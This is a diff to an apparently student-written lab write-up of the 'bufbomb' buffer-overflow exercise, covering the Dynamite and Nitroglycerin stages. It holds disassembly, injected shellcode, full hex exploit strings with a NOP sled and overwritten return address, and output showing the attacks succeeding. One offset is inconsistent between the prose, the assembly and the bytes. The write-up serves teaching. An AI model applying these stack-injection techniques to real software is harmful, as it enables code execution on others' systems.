@@ -266,3 +266,125 @@ But, I bumped this problem while using `execstack` and couldn't solve it.
 execstack: bufbomb: section file offsets not monotonically increasing.
 ```
 
+<u>***Lower version's bufbomb will be used instead afterward.***</u>
+
+
+
+### 4. Dynamite
+
+Goal: Attack without corruptions to the stack state, then modify the return value to the cookie.
+
+First of all, we need to set return address to the instruction after `getbuf()`, which is at `0x804901e` according to assembly code of `test()`. Then, we need to change the `val` to our cookie instead of the return value of `getbuf()`, by using `mov` instruction. Finally, return. The assembly code is shown below.
+
+```
+00000000 <.text>:
+   0:	b8 e7 e9 88 57       	mov    $0x5788e9e7,%eax
+   5:	68 1e 90 04 08       	push   $0x804901e
+   a:	c3                   	ret    
+```
+
+In order not to break the stack frame structure, we need to record the value of the `%ebp` after calling `getbuf()`, which is `0xffffb258`.
+
+The bytes will be injected are shown below.
+
+```
+b8 e7 e9 88 57 68 1e 90 04 08 c3 00 58 b2 ff ff 2c b2 ff ff
+```
+
+Note that `0xffffb22c` is the address of the input buffer.
+
+```
+Team: 0
+Cookie: 0x5788e9e7
+Type string:Boom!: getbuf returned 0x5788e9e7
+```
+
+
+
+### 5. Nitroglycerin
+
+Goal: Attack while program is loaded in different stack address, then modify the return value to the cookie.
+
+We need to use the `-n` option to run this stage according to the writeup. Then, the program will call `getbufn()` instead of `getbuf()` in `testn()`, which offers a larger input buffer of size `0x200` bytes.
+
+```
+08048f70 <testn>:
+ 8048f70:	55                   	push   %ebp
+ 8048f71:	89 e5                	mov    %esp,%ebp
+ 8048f73:	83 ec 18             	sub    $0x18,%esp
+ 8048f76:	c7 45 fc ef be ad de 	movl   $0xdeadbeef,-0x4(%ebp)
+ 8048f7d:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
+ 8048f84:	e8 17 fa ff ff       	call   80489a0 <entry_check>
+ 8048f89:	e8 c2 ff ff ff       	call   8048f50 <getbufn>
+ 8048f8e:	89 c2                	mov    %eax,%edx
+ 8048f90:	8b 45 fc             	mov    -0x4(%ebp),%eax
+ 8048f93:	3d ef be ad de       	cmp    $0xdeadbeef,%eax
+ 8048f98:	74 0e                	je     8048fa8 <testn+0x38>
+ 8048f9a:	c7 04 24 b8 98 04 08 	movl   $0x80498b8,(%esp)
+ 8048fa1:	e8 6e f7 ff ff       	call   8048714 <puts@plt>
+ 8048fa6:	c9                   	leave  
+ 8048fa7:	c3                   	ret    
+ 8048fa8:	3b 15 cc a1 04 08    	cmp    0x804a1cc,%edx
+ 8048fae:	74 12                	je     8048fc2 <testn+0x52>
+ 8048fb0:	89 54 24 04          	mov    %edx,0x4(%esp)
+ 8048fb4:	c7 04 24 62 9a 04 08 	movl   $0x8049a62,(%esp)
+ 8048fbb:	e8 a4 f7 ff ff       	call   8048764 <printf@plt>
+ 8048fc0:	c9                   	leave  
+ 8048fc1:	c3                   	ret    
+ 8048fc2:	89 54 24 04          	mov    %edx,0x4(%esp)
+ 8048fc6:	c7 04 24 e4 98 04 08 	movl   $0x80498e4,(%esp)
+ 8048fcd:	e8 92 f7 ff ff       	call   8048764 <printf@plt>
+ 8048fd2:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
+ 8048fd9:	e8 02 fb ff ff       	call   8048ae0 <validate>
+ 8048fde:	c9                   	leave  
+ 8048fdf:	c3                   	ret    
+```
+
+```
+08048f50 <getbufn>:
+ 8048f50:	55                   	push   %ebp
+ 8048f51:	89 e5                	mov    %esp,%ebp
+ 8048f53:	81 ec 08 02 00 00    	sub    $0x208,%esp
+ 8048f59:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
+ 8048f5f:	89 04 24             	mov    %eax,(%esp)
+ 8048f62:	e8 f9 fe ff ff       	call   8048e60 <Gets>
+ 8048f67:	b8 01 00 00 00       	mov    $0x1,%eax
+ 8048f6c:	c9                   	leave  
+ 8048f6d:	c3                   	ret    
+ 8048f6e:	89 f6                	mov    %esi,%esi
+```
+
+From `0x8048f73` we can learn that the `%ebp` holds the constant distance `0x1c` from `%esp`. But where would our code start? The start address of input buffer is dynamic, we can just put our code in address as higher as possible, then fill the lower address part with `nop`. 
+
+So we can organize the injected code as shown below.
+
+```
+00000000 <.text>:
+   0:	b8 e7 e9 88 57       	mov    $0x5788e9e7,%eax
+   5:	8d 6c 24 22          	lea    0x22(%esp),%ebp
+   9:	68 8e 8f 04 08       	push   $0x8048f8e
+   e:	c3                   	ret    
+```
+
+In order to jump to our code in buffer, we should execute `testn()` for multiple times, record the highest address of `%ebp`.
+
+```
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 b8 e7 e9 88 57 8d 6c 24 18 68 8e 8f 04 08 c3 38 b0 ff ff
+```
+
+Note that the `0xffffb038` is the highest address of input buffer.
+
+```
+Team: 0
+Cookie: 0x5788e9e7
+Type string:KABOOM!: getbufn returned 0x5788e9e7
+Keep going
+Type string:KABOOM!: getbufn returned 0x5788e9e7
+Keep going
+Type string:KABOOM!: getbufn returned 0x5788e9e7
+Keep going
+Type string:KABOOM!: getbufn returned 0x5788e9e7
+Keep going
+Type string:KABOOM!: getbufn returned 0x5788e9e7
+```
+
